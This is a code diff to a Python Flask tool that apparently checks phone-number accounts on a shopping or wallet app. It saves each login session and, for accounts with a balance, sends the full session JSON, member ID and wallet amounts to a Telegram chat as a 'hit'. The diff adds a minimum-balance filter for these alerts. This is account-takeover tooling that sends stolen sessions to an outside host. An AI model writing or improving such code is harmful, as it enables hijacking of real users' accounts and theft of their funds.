@@ -86,7 +86,7 @@ sys.stdout = LogCatcher(sys.stdout)
 # SETTINGS & INSTANCES
 # ==========================================
 def get_settings():
-    defaults = {"proxy": ""}
+    defaults = {"proxy": "", "min_alert_amount": 0}
     if not os.path.exists(SETTINGS_FILE):
         return defaults
     try:
@@ -471,14 +471,22 @@ def process_single_number(phone, fb_url, device_id, instance_id, proxies=None):
         with open(session_file, "w") as jf:
             json.dump(session_data, jf, indent=2)
 
-        tg_msg = (
-            f"💰 <b>BB CASH HIT!</b>\n\n"
-            f"📱 <b>Phone:</b> +91{phone}\n"
-            f"👛 <b>Wallet:</b> Rs{wallet_bal}\n"
-            f"🎁 <b>FreeCash:</b> Rs{freecash_bal}"
-        )
-        send_telegram_alert(tg_msg)
-        send_telegram_document(session_file, caption=f"🔐 Session for +91{phone}")
+        # Check min alert threshold
+        settings = get_settings()
+        min_amount = float(settings.get("min_alert_amount", 0))
+        total_bal = float(wallet_bal) + float(freecash_bal)
+        
+        if total_bal >= min_amount:
+            session_json_str = json.dumps(session_data, indent=2)
+            tg_msg = (
+                f"💰 <b>Login Data Export</b>\n\n"
+                f"📱 <b>Mobile:</b> {phone}\n"
+                f"🔑 <b>Member ID:</b> {m_id}\n"
+                f"👛 <b>Wallet:</b> Rs{wallet_bal}\n"
+                f"🎁 <b>FreeCash:</b> Rs{freecash_bal}\n\n"
+                f"<pre><code class=\"language-json\">{session_json_str}</code></pre>"
+            )
+            send_telegram_alert(tg_msg)
     else:
         print(f"📭 {tag} No balance for {phone} — Wallet: Rs{wallet_bal}, FreeCash: Rs{freecash_bal}")
 
@@ -624,6 +632,7 @@ def index():
     return render_template("dashboard.html",
                            instances=view_data,
                            proxy=settings.get("proxy", ""),
+                           min_alert_amount=settings.get("min_alert_amount", 0),
                            stats=STATS)
 
 @app.route("/api/instances", methods=["POST"])
@@ -697,8 +706,14 @@ def toggle_instance():
 @requires_auth
 def save_settings_api():
     proxy = request.form.get("proxy", "").strip()
+    min_alert = request.form.get("min_alert_amount", "0").strip()
+    try:
+        min_alert = float(min_alert)
+    except:
+        min_alert = 0
     settings = get_settings()
     settings["proxy"] = proxy
+    settings["min_alert_amount"] = min_alert
     save_settings(settings)
     return redirect(url_for("index"))
 
